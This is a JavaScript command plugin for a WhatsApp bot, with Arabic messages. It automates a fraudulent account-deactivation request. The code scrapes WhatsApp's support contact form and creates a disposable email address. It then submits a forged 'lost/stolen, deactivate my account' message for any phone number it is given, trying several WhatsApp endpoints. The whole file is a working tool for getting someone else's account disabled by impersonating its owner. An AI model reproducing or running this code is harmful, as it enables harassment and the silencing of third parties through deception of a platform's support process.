import cheerio from "cheerio";
import axios from "axios";
import util from 'util';

let handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
  const q = args.join(" ");
  if (!q || !args[0]) throw '[❗] يرجى إدخال الرقم المراد تعطيله بصيغة دولية، مثال: +14155552671';

  let servers = [
    "https://www.whatsapp.com/contact/noclient/",
    "https://faq.whatsapp.com/contact/noclient/",
    "https://www.whatsapp.net/contact/noclient/"
  ];

  let lastError = null;
  for (let link of servers) {
    try {
      let ntah = await axios.get(link);
      let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
      let cookie = ntah.headers["set-cookie"].join("; ");
      let $ = cheerio.load(ntah.data);
      let $form = $("form");
      let url = new URL($form.attr("action"), link).href;
      let form = new URLSearchParams();

      form.append("jazoest", $form.find("input[name=jazoest]").val());
      form.append("lsd", $form.find("input[name=lsd]").val());
      form.append("step", "submit");
      form.append("country_selector", "ID");
      form.append("phone_number", q);
      form.append("email", email.data[0]);
      form.append("email_confirm", email.data[0]);
      form.append("platform", "ANDROID");
      form.append("your_message", "Perdido/roubado: desative minha conta: " + q);
      form.append("__user", "0");
      form.append("__a", "1");
      form.append("__csr", "");
      form.append("__req", "8");
      form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
      form.append("dpr", "1");
      form.append("__ccg", "UNKNOWN");
      form.append("__rev", "1006630858");
      form.append("__comment_req", "0");

      let res = await axios({ url, method: "POST", data: form, headers: { cookie } });
      let payload = String(res.data);

      if (payload.includes(`"payload":true`)) {
        return await m.reply(`✅ تم إرسال طلب تعطيل الرقم بنجاح إلى واتساب.`);
      } else if (payload.includes(`"payload":false`)) {
        return await m.reply(`⚠️ فشل في التحقق، قد تحتاج لتأكيد ملكيتك للرقم.`);
      } else {
        let json = JSON.parse(payload.replace("for (;;);", ""));
        return await m.reply(util.format(json));
      }
    } catch (e) {
      lastError = e.message;
      continue;
    }
  }

  return await m.reply(`❌ فشل الاتصال بجميع السيرفرات. آخر خطأ: ${lastError}`);
};

handler.command = /^.?دعم$/i;
handler.rowner = true;
export default handler;